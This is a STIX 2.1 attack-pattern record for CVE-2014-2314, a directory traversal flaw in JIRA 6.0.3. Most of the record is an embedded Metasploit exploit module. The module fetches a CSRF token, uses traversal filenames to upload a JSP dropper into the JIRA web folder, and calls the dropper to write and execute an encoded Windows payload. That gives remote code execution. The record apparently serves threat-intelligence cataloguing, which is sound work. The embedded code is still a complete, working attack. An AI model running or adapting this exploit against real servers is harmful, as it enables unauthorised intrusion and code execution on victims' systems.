{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0d60d2ac-f9d3-427d-8294-dc0f2bf15701",
    "created": "2024-08-14T16:55:18.223923Z",
    "modified": "2024-08-14T16:55:18.223927Z",
    "name": "JIRA Issues Collector Directory Traversal",
    "description": " This module exploits a directory traversal flaw in JIRA 6.0.3. The vulnerability exists in the issues collector code, while handling attachments provided by the user. It can be exploited in Windows environments to get remote code execution. This module has been tested successfully on JIRA 6.0.3 with Windows 2003 SP2 Server. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/jira_collector_traversal.rb",
            "external_id": "jira_collector_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-2314"
        },
        {
            "source_name": "reference",
            "url": "https://confluence.atlassian.com/display/JIRA/JIRA+Security+Advisory+2014-02-26"
        },
        {
            "source_name": "reference",
            "url": "http://blog.h3xstream.com/2014/02/jira-path-traversal-explained.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'JIRA Issues Collector Directory Traversal',\n      'Description' => %q{\n        This module exploits a directory traversal flaw in JIRA 6.0.3. The vulnerability exists\n        in the issues collector code, while handling attachments provided by the user. It can be\n        exploited in Windows environments to get remote code execution. This module has been tested\n        successfully on JIRA 6.0.3 with Windows 2003 SP2 Server.\n      },\n      'Author'       =>\n        [\n          'Philippe Arteau', # Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2014-2314'],\n          [ 'OSVDB', '103807' ],\n          [ 'BID', '65849' ],\n          [ 'URL', 'https://confluence.atlassian.com/display/JIRA/JIRA+Security+Advisory+2014-02-26' ],\n          [ 'URL', 'http://blog.h3xstream.com/2014/02/jira-path-traversal-explained.html' ]\n        ],\n      'Privileged'  => true,\n      'Platform'    => 'win',\n      'Targets'     =>\n        [\n          [ 'Jira 6.0.3 / Windows 2003 SP2',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-02-26'))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [true, 'Path to JIRA', '/']),\n        OptString.new('COLLECTOR', [true, 'Collector ID'])\n      ])\n\n    register_advanced_options(\n      [\n        # By default C:\\Program Files\\Atlassian\\JIRA\\atlassian-jira\\QhVRutsh.jsp\n        OptString.new('JIRA_PATH', [true, 'Path to the JIRA web folder from the Atlassian installation directory', \"JIRA\\\\atlassian-jira\"]),\n        # By default file written to C:\\Program Files\\Atlassian\\Application Data\\JIRA\\caches\\tmp_attachments\\$random_\\, we want to traversal until 'Atlassian'\n        OptInt.new('TRAVERSAL_DEPTH', [true, 'Traversal depth', 6])\n      ])\n  end\n\n  def get_upload_token\n    res = send_request_cgi(\n      {\n        'uri'    => normalize_uri(target_uri.path, \"rest\", \"collectors\", \"1.0\", \"tempattachment\", datastore['COLLECTOR']),\n        'method' => 'POST',\n        'data'   => rand_text_alpha(10 + rand(10)),\n        'vars_get' =>\n          {\n            'filename' => rand_text_alpha(10 + rand(10))\n          }\n      })\n\n    if res and res.code == 500 and res.body =~ /\"token\":\"(.*)\"}/\n      csrf_token = $1\n      @cookie = res.get_cookies\n    else\n      csrf_token = \"\"\n    end\n\n    return csrf_token\n  end\n\n  def upload_file(filename, contents, csrf_token)\n    traversal = \"..\\\\\" * datastore['TRAVERSAL_DEPTH']\n    traversal << datastore['JIRA_PATH']\n\n    res = send_request_cgi(\n      {\n        'uri'    => normalize_uri(target_uri.path, \"rest\", \"collectors\", \"1.0\", \"tempattachment\", datastore['COLLECTOR']),\n        'method' => 'POST',\n        'data'   => contents,\n        'cookie' => @cookie,\n        'ctype'  => 'text/plain',\n        'vars_get' =>\n          {\n            'filename' => \"#{traversal}\\\\#{filename}\",\n            'atl_token' => csrf_token\n          }\n      })\n\n    if res and res.code == 201 and res.body =~ /\\{\"name\":\".*#{filename}\"/\n      register_files_for_cleanup(\"..\\\\..\\\\#{datastore['JIRA_PATH']}\\\\#{filename}\")\n      register_files_for_cleanup(\"..\\\\..\\\\#{datastore['JIRA_PATH']}\\\\#{@exe_filename}\")\n      return true\n    else\n      print_error(\"Upload failed...\")\n      return false\n    end\n  end\n\n  def upload_and_run_jsp(filename, contents)\n    print_status(\"Getting a valid CSRF token...\")\n    csrf_token = get_upload_token\n    fail_with(Failure::Unknown, \"#{peer} - Unable to find the CSRF token\") if csrf_token.empty?\n\n    print_status(\"Exploiting traversal to upload JSP dropper...\")\n    upload_file(filename, contents, csrf_token)\n\n    print_status(\"Executing the dropper...\")\n    send_request_cgi(\n      {\n        'uri'    => normalize_uri(target_uri.path, filename),\n        'method' => 'GET'\n      })\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'login.jsp'),\n    })\n\n    if res and res.code == 200 and res.body =~ /<meta name=\"application-name\" content=\"JIRA\" data-name=\"jira\" data-version=\"([0-9\\.]*)\">/\n      version = $1\n    else\n      return Exploit::CheckCode::Unknown\n    end\n\n    if version <= \"6.0.3\"\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"Generating EXE...\")\n    exe = payload.encoded_exe\n    @exe_filename = Rex::Text.rand_text_alpha(8) + \".exe\"\n\n    print_status(\"Generating JSP dropper...\")\n    dropper = jsp_drop_and_execute(exe, @exe_filename)\n    dropper_filename = Rex::Text.rand_text_alpha(8) + \".jsp\"\n\n    print_status(\"Uploading and running JSP dropper...\")\n    upload_and_run_jsp(dropper_filename, dropper)\n  end\n\n  # This should probably go in a mixin (by egypt)\n  def jsp_drop_bin(bin_data, output_file)\n    jspraw =  %Q|<%@ page import=\"java.io.*\" %>\\n|\n    jspraw << %Q|<%\\n|\n    jspraw << %Q|String data = \"#{Rex::Text.to_hex(bin_data, \"\")}\";\\n|\n\n    jspraw << %Q|FileOutputStream outputstream = new FileOutputStream(\"#{output_file}\");\\n|\n\n    jspraw << %Q|int numbytes = data.length();\\n|\n\n    jspraw << %Q|byte[] bytes = new byte[numbytes/2];\\n|\n    jspraw << %Q|for (int counter = 0; counter < numbytes; counter += 2)\\n|\n    jspraw << %Q|{\\n|\n    jspraw << %Q|  char char1 = (char) data.charAt(counter);\\n|\n    jspraw << %Q|  char char2 = (char) data.charAt(counter + 1);\\n|\n    jspraw << %Q|  int comb = Character.digit(char1, 16) & 0xff;\\n|\n    jspraw << %Q|  comb <<= 4;\\n|\n    jspraw << %Q|  comb += Character.digit(char2, 16) & 0xff;\\n|\n    jspraw << %Q|  bytes[counter/2] = (byte)comb;\\n|\n    jspraw << %Q|}\\n|\n\n    jspraw << %Q|outputstream.write(bytes);\\n|\n    jspraw << %Q|outputstream.close();\\n|\n    jspraw << %Q|%>\\n|\n\n    jspraw\n  end\n\n  def jsp_execute_command(command)\n    jspraw =  %Q|<%@ page import=\"java.io.*\" %>\\n|\n    jspraw << %Q|<%\\n|\n    jspraw << %Q|try {\\n|\n    jspraw << %Q|  Runtime.getRuntime().exec(\"chmod +x #{command}\");\\n|\n    jspraw << %Q|} catch (IOException ioe) { }\\n|\n    jspraw << %Q|Runtime.getRuntime().exec(\"#{command}\");\\n|\n    jspraw << %Q|%>\\n|\n\n    jspraw\n  end\n\n  def jsp_drop_and_execute(bin_data, output_file)\n    jsp_drop_bin(bin_data, output_file) + jsp_execute_command(output_file)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-02-26",
    "x_mitre_platforms": [
        "win"
    ]
}